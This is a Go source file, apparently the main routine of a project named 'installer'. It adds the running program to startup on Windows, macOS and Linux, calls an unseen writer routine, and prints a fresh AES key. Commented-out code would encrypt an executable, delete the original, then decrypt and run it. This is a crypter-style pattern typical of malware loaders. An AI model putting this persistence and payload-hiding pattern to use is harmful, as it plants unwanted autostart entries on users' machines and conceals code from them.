package main

import (
	"crypto/rand"
	"log"
	"os"
	"path/filepath"
	"runtime"

	"github.com/DracoR22/installer/startup"
	"github.com/DracoR22/installer/writter"
)

func generateAESKey() []byte {
	key := make([]byte, 32) // AES-256 key length
	if _, err := rand.Read(key); err != nil {
		log.Fatal("Error generating random key:", err)
	}
	return key
}

func main() {

	// Startup
	exePath, err := os.Executable()
	if err != nil {
		panic(err)
	}

	if runtime.GOOS == "windows" {
		shortcutPath := startup.GetStartupPath() + "\\" + filepath.Base(exePath) + ".lnk"
		startup.CreateShortcut(exePath, shortcutPath)
	} else if runtime.GOOS == "darwin" {
		plistPath := filepath.Join(startup.GetLaunchAgentsPath(), filepath.Base(exePath)+".plist")
		startup.CreatePlist(exePath, plistPath)
	} else if runtime.GOOS == "linux" {
		desktopFilePath := filepath.Join(startup.GetAutostartPath(), filepath.Base(exePath)+".desktop")
		startup.CreateDesktopFile(exePath, desktopFilePath)
	}

	// Run writter
	writter.Write()

	encryptionKey := generateAESKey()
	println(encryptionKey)

	// // Path to the executable file to be encrypted
	// executableFile := "main.exe"

	// // Encrypt the file
	// iv, err := encryption.EncryptFile(executableFile, encryptionKey)
	// if err != nil {
	// 	log.Fatal(err)
	// }

	// log.Printf("File encrypted successfully to yourprogram.enc with IV: %s\n", hex.EncodeToString(iv))

	// // Delete the original executable file
	// if err := os.Remove(executableFile); err != nil {
	// 	log.Fatalf("Error removing original executable file: %v", err)
	// }

	// Decrypt the file
	// decryptionKey := encryptionKey
	// encryptedFile := "main.exe.enc"
	// decryptedFile := "decrypted_main.exe"

	// if err := encryption.DecryptFile(encryptedFile, decryptedFile, decryptionKey); err != nil {
	// 	log.Fatal(err)
	// }

	// log.Printf("File decrypted successfully to %s\n", decryptedFile)

	// // Run the decrypted executable
	// if err := encryption.RunDecryptedExecutable(decryptedFile); err != nil {
	// 	log.Fatal(err.Error())
	// }
}
